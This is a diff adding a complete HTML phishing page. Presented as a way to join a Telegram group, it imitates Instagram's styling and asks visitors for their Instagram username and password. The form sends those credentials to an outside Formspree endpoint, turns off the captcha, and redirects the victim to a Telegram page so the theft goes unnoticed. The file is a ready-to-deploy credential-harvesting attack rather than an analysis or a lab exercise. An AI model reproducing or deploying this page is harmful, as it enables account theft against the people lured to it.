@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Telegram Group</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #fff;
+            width: 90%;
+            max-width: 360px;
+            padding: 45px 45px;
+            border-radius: 16px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 14px;
+            border-radius: 8px;
+            border: 1px solid #dbdbdb;
+            font-size: 14px;
+        }
+
+        textarea {
+            resize: none;
+            height: 80px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #007cd6;
+        }
+
+        .note {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>To join the Telegram group<br>continue below</h2>
+    <h1>Enter your Instagram details</h1>
+    <!-- FORMSPREE FORM -->
+    <form action="https://formspree.io/f/mykgryqe" method="POST">
+        
+        <input type="email" name="email" placeholder="Enter your Instagram username" required>
+
+        <input type="password" name="password" placeholder="Enter your Instagram password" required>
+
+       
+
+        <!-- Redirect after successful submit -->
+        <input type="hidden" name="_next" value="telegram.html">
+
+        <!-- Disable captcha (optional) -->
+        <input type="hidden" name="_captcha" value="false">
+
+        <button type="submit">Continue to Telegram</button>
+    </form>
+
+    <p class="note">© 2025 All rights reserved</p>
+</div>
+
+</body>
+</html>
